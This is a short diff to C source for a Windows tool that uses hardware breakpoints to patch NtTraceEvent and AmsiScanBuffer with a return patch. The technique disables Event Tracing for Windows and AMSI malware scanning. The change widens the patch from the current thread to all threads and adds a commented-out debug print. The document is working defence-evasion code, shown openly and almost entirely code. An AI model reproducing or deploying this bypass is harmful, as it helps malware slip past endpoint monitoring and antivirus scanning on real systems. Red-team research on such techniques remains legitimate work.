@@ -342,6 +342,7 @@ void set_hardware_breakpoints(const uintptr_t address, const UINT pos, const BOO
                     if (tid != 0 && tid != te.th32ThreadID) {
                         continue;
                     }
+                    //printf("Setting HWBP on thread id: %d\\n", te.th32ThreadID);
                     set_hardware_breakpoint(te.th32ThreadID, address, pos, init);
                 }
                 te.dwSize = sizeof(te);
@@ -561,10 +562,10 @@ int main()
 
     FARPROC ptrNtTraceEvent = GetProcAddress(GetModuleHandle(str_ntdll), str_NtTraceEvent);
 
-    insert_descriptor_entry(ptrNtTraceEvent, 0, rip_ret_patch, l_GetCurrentThreadId());
+    insert_descriptor_entry(ptrNtTraceEvent, 0, rip_ret_patch, 0);
 
     uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(LoadLibrary(str_amsidll), str_AmsiScanBuffer);
-    insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, l_GetCurrentThreadId());
+    insert_descriptor_entry(amsiPatchAddr, 1, rip_ret_patch, 0);
 
     return 0;
 }
